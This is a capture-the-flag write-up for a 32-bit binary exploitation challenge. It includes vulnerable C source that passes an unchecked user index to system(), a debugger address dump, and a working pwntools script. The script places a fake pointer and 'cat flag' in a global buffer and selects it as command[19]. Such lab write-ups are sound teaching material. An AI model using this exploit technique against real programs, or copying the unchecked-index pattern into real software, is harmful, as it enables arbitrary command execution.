# Write-up of the challenge "Out_of_bound"

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to to use **out bounds** to access a pointer where **/bin/sh** would be stored.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}

// nxpgdnbpzewlofptn

```


## Security breach

The vulnerability here is **system(command[idx]);**, because it does not validate if the idx is bigger or less than the array.


## Solution

My idea was to check the offset between **name** and **command[0]** and then use it to make it point to an address in the name buffer.
Here as you can see I found their addresses and since we are using **32 bit program array** we need to divide the offset later by **4**.


```
pwndbg> disas &command
Dump of assembler code for function command:
   0x0804a060 <+0>:     lock xchg DWORD PTR [eax+ecx*1],eax

pwndbg> disas &name
Dump of assembler code for function name:
   0x0804a0ac <+0>:     add    BYTE PTR [eax],al
  
```

**(0x0804a0ac - 0x0804a060) / 4 = 19**, now we found our offset. So now we would be trying to tell the program to access pointer at **command[19]**, which is the start of our name buffer, but in the start of the name buffer we tell it to access the value stored at pointer **4 bytes** after the start of our name buffer so that means we just assigned **system('cat flag')** because after 4 bytes of the name buffer this exists **b'cat flag'**.

solve.py:

```
from pwn import *

#p = process('./out_of_bound')
p = remote('host8.dreamhack.games', 23496)

# (0x0804a0ac - 0x0804a060) / 4 = 19
name_addr = 0x0804a0ac
payload = p32(name_addr+4)
payload += b'cat flag'

p.sendline(payload)

p.sendline(b'19')



p.interactive()

```